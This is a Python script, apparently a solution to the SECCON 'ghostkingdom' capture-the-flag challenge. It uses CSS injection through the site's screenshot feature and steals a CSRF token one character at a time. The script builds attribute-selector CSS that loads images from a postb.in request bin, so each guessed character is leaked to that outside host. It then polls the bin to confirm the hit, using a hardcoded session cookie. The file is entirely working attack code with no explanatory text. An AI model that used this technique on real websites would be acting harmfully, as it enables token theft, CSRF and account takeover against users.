import requests
import base64
import json
import urllib.parse
import time

hex = "0123456789abcdef"
csrf = "be2a12eac37f"
s = requests.Session()
s.cookies.set("CGISESSID", "4da7c2338c6799e9dfd77b")

for i in range(22 - len(csrf)):
    print(csrf)
    bin_id = json.loads(requests.post("http://postb.in/api/bin").text)["binId"]
    print(bin_id)
    for c in hex:
        test = csrf + c
        print(test)
        css = "input[value^=\"" + test + "\"] { background: url(http://postb.in/" + bin_id + "); }"
        css = base64.b64encode(css.encode("ascii"))
        payload = "http://foo.vcap.me/?" + urllib.parse.urlencode({"css": css, "msg": "", "action": "msgadm2"})
        payload2 = "http://ghostkingdom.pwn.seccon.jp/?" + urllib.parse.urlencode({"url": payload, "action": "sshot2"})
        while True:
            try:
                resp = s.get(payload2).text
                if "wait" not in resp:
                    break
            except:
                pass
            time.sleep(5)
            print("Trying again")
        resp = requests.get("http://postb.in/api/bin/" + bin_id + "/req/shift").status_code
        if resp == 200:
            csrf += c
            requests.delete("http://postb.in/api/bin/" + bin_id)
            break
